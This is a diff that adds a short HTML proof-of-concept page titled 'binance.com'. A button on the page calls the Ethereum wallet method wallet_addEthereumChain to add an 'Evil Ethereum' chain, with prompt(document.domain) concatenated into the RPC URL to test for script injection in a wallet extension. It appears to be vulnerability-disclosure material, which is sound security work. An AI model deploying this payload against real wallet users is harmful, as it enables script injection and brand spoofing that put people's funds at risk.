@@ -1,0 +1,25 @@
+<html>
+<body>
+<title>binance.com</title>
+<h1>PoC</h1>
+<script>
+    function exploit(){
+        window.ethereum.request({
+            method: "wallet_addEthereumChain",
+            params: [{
+                chainId: "0x31339",
+                chainName: "Evil Ethereum",
+                rpcUrls: ['https://rpc-mumbai.matic.today/x'+prompt(document.domain)+''],
+                nativeCurrency: {
+                    name: "Evil",
+                    symbol: "Test",
+                    decimals: 18,
+                },
+                blockExplorerUrls: ["https://explorer-mumbai.maticvigil.com"],
+            }],
+        });
+    }
+</script>
+<button onclick="exploit()" style="width:70%; height: 15%; font-size: 40px;">Press me!</button>
+</body>
+</html>
